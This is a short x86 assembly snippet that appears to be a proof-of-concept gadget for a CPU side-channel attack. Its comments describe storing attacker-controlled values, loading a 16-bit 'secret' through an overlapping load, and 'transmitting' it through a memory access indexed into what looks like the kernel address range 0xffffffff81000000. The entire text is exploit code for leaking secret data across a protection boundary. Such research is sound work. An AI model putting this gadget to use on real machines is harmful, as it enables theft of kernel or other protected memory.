.intel_syntax noprefix

store_half_overlap:
   # We store two 64-bit attacker controlled values
   mov    QWORD PTR [r8], rsi
   mov    QWORD PTR [r8 + 10], rdi

   # Now we load the two attacker controlled into 64-bit register
   # The middle part [32:48], without any store associated to it,
   # will be marked as a secret:
   # RDI[15:0] << 47 ... SECRET_16 << 32 ... RSI[63:32]
   mov   rdi, QWORD PTR [r8 + 4]

   # load secret
   movzx  r11, WORD PTR [rdx]
   # transmit
   mov    rdi, QWORD PTR [r11 + rdi + 0xffffffff81000000]
	jmp     0xdead
